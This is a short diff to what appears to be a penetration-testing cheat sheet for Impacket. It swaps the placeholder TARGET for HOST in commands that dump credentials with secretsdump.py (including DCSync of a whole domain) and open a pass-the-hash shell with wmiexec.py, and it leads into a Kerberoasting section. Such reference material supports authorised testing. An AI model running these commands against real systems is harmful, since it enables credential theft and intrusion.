@@ -33,14 +33,14 @@ Credentials are given as `DOMAIN/user:password@HOST`, or with `-hashes LM:NT` fo
 Dump secrets from a host (local admin), or the whole domain from a DC (DCSync rights):
 
 ```bash
-secretsdump.py CORP/administrator:'Passw0rd!'@TARGET
+secretsdump.py CORP/administrator:'Passw0rd!'@HOST
 secretsdump.py -just-dc CORP/administrator:'Passw0rd!'@DC01
 ```
 
 Pass-the-hash to a shell on a host where the hash is admin:
 
 ```bash
-wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/administrator@TARGET
+wmiexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 CORP/administrator@HOST
 ```
 
 Kerberoast: request service tickets to crack offline:
